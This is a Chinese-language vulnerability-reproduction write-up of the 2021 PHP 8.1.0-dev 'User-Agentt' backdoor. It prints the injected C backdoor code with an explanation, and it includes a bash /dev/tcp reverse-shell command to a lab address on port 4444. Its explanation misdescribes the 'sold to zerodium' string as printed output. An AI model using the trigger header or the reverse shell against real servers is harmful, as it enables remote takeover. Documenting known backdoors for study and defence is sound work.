---
title: PHP 8.1.0-dev 开发版本后门事件
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-28T17:50:00+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

**漏洞介绍:**

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送**User-Agentt**头来执行任意代码

https://news-web.php.net/php.internals/113838

**漏洞复现**

![8.1](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1.png)

能够以

```
zerdiumsystem
```

的形式执行任意代码，也可以通过该后门进行反向shell的链接

```
/bin/bash -c 'exec bash -i >& /dev/tcp/192.168.121.135/4444 0>&1'
```

![8.1shell](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\8.1shell.png)

**后门代码**

```c
if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
		convert_to_string(enc);
		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
			zend_try {
				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
			} zend_end_try();
		}
	}
```

这段代码的作用是检查 HTTP 请求头中的 "User-Agentt" 字段是否包含字符串 "zerodium"，如果包含，则执行一个 PHP 代码段,具体流程如下

1. 检查全局变量 PG(http_globals)[TRACK_VARS_SERVER] 是否为数组类型或者是否已经被自动注册为全局变量 "_SERVER"，如果是则继续执行。
2. 使用 zend_hash_str_find 函数在 PG(http_globals)[TRACK_VARS_SERVER] 中查找 "HTTP_USER_AGENTT" 字段，并将其值存储到 enc 变量中。
3. 将 enc 变量转换为字符串类型，并使用 strstr 函数检查字符串中是否包含 "zerodium" 子字符串。如果包含，则继续执行。
4. 使用 zend_eval_string 函数执行一个 PHP 代码段，该代码段是从 User-Agentt字段的第八个字符开始的字符串，它会输出一条提示信息 "REMOVETHIS: sold to zerodium, mid 2017"。

